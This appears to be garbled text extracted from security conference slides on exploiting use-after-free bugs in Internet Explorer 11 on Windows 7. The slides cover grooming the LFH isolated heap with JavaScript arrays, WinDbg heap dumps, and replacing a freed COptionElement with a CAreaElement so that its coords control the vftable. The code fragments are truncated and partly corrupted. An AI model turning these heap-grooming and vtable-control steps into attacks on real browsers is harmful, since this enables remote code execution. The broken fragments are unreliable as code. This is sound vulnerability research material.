  Free	
  Situa-on	
  ☺	
//	
  Free	
  Use-­‐After-­‐Free	
  Object	
//	
  Use-­‐After-­‐Free	
  Object	
  not	
  referred	
  in	
  stack	
CollectGarbage2();	
  //	
  Free	
  Use-­‐After	
  Object	
  indeed	
//	
  Fill	
  Use-­‐After-­‐Free	
  Object	
//	
  Use	
  Use-­‐After-­‐Free	
  Object	
46	
Never	
  Use-­‐ARer-­‐Free	
  Situa-on	
//	
  Trigger	
  Event	
//	
  Use	
  Use-­‐After-­‐Free	
  Object	
//	
  Cannot	
  refer	
  to	
  Use-­‐After-­‐Free	
  Object	
//	
  Event	
//	
  Free	
  Use-­‐After-­‐Free	
  Object	
//	
  Use-­‐After-­‐Free	
  Object	
  referred	
  in	
  stack	
47	
Case	
  By	
  Case	
• 
Many	
  paths	
  can	
  trigger	
  same	
  Use-­‐ARer-­‐Free	
• 
It’s	
  hard	
  to	
  say	
48	
Fill	
  Problem	
• 
Manipulate	
  LFH	
• 
Windows	
  7	
  x86	
• 
Internet	
  Explorer	
  11	
49	
Step	
  1	
50	
Step	
  1	
0:007>	
  !heap	
  -­‐p	
  -­‐h	
  poi(MSHTML!g_hIsolatedHeap)	
  _HEAP	
  @	
  3ac0000	
  _LFH_HEAP	
  @	
  3ac44f0	
  _HEAP_SEGMENT	
  @	
  3ac0000	
  CommittedRange	
  @	
  3ac0588	
  HEAP_ENTRY	
  Size	
  Prev	
  Flags	
  UserPtr	
  UserSize	
  -­‐	
  state	
…	
  03ad5130	
  003b	
  0086	
  [00]	
  03ad5138	
  001d0	
  -­‐	
  (busy)	
  MSHTML!CWindow::`vftable‘	
…	
VirtualAllocdBlocks	
  @	
  3ac00a0	
51	
Step	
  2	
var	
  Bucket1	
  =	
  new	
  Array();	
  //	
  Enable	
  LFH	
for	
  (var	
  i	
  =	
  0;	
  i	
  !heap	
  -­‐p	
  -­‐h	
  poi(MSHTML!g_hIsolatedHeap)	
…	
  *	
  03ad6650	
  0200	
  000b	
  [00]	
  03ad6658	
  00ff8	
  -­‐	
  (busy)	
  //	
UserBlocks1	
  03ad6668	
  000b	
  0200	
  [00]	
  03ad6670	
  0004c	
  -­‐	
  (busy)	
  MSHTML!COptionElement::`vftable'	
…	
  *	
  03ad7a50	
  0200	
  0080	
  [00]	
  03ad7a58	
  00ff8	
  -­‐	
  (busy)	
  //	
UserBlocks2	
  03ad7a68	
  000b	
  0200	
  [00]	
  03ad7a70	
  0004c	
  -­‐	
  (busy)	
  MSHTML!COptionElement::`vftable'	
…	
  VirtualAllocdBlocks	
  @	
  3ac00a0	
53	
Step	
  3	
UserBlocks1	
  =	
  null;	
CollectGarbage();	
CollectGarbage2();	
54	
Step	
  3	
0:007>	
  !heap	
  -­‐p	
  -­‐h	
  poi(MSHTML!g_hIsolatedHeap)	
…	
  *	
  03ad6650	
  0200	
  000b	
  [00]	
  03ad6658	
  00ff8	
  -­‐	
  (busy)	
  //	
UserBlocks1	
…	
  *	
  03ad7a50	
  0200	
  0080	
  [00]	
  03ad7a58	
  00ff8	
  -­‐	
  (busy)	
  //	
UserBlocks2	
  03ad7a68	
  000b	
  0200	
  [00]	
  03ad7a70	
  0004c	
  -­‐	
  (busy)	
  MSHTML!COptionElement::`vftable'	
…	
  VirtualAllocdBlocks	
  @	
  3ac00a0	
55	
Step	
  4	
var	
  Bucket2	
  =	
  new	
  Array();	
  //	
  Enable	
  LFH	
for	
  (var	
  i	
  =	
  0;	
  i	
  !heap	
  -­‐p	
  -­‐h	
  poi(MSHTML!g_hIsolatedHeap)	
…	
  *	
  03ad6650	
  0200	
  000b	
  [00]	
  03ad6658	
  00ff8	
  -­‐	
  (busy)	
  //	
UserBlocks1	
  03ad6668	
  000e	
  0200	
  [00]	
  03ad6670	
  00064	
  -­‐	
  (busy)	
  MSHTML!CAreaElement::`vftable'	
…	
  *	
  03ad7a50	
  0200	
  0080	
  [00]	
  03ad7a58	
  00ff8	
  -­‐	
  (busy)	
  //	
UserBlocks2	
  03ad7a68	
  000b	
  0200	
  [00]	
  03ad7a70	
  0004c	
  -­‐	
  (busy)	
  MSHTML!COptionElement::`vftable'	
…	
  VirtualAllocdBlocks	
  @	
  3ac00a0	
57	
CAreaElement	
• 
0x64	
  bytes	
• 
+0x4c	
  RECT	
• 
+0x4c	
  leR	
• 
+0x50	
  top	
• 
+0x54	
  right	
• 
+0x58	
  boeom	
58	
CAreaElement	
• 
shape	
  =	
  "rect"	
• 
coords	
  =	
  "1,2,3,4"	
59	
CAreaElement	
• 
+0x4c	
  1	
• 
+0x50	
  2	
• 
+0x54	
  3	
• 
+0x58	
  4	
60	
Control	
  vRable	
  of	
  COp-onElement	
var	
  i;	
  //	
  index	
  of	
  Use-­‐After-­‐Free	
  COptionElement	
var	
  j;	
  //	
  index	
  of	
  corresponding	
  CAreaElement	
for	
  (i	
  =	
  0;	
  i	
  =	
  0x4c	
  &&	
  r	
  vftable	
  of	
  Use-­‐After-­‐Free	
  COptionElement	
64	
65	
Thanks	
Liang	
  Chen	
wu	
  shi	
humeafo 
END	
Thanks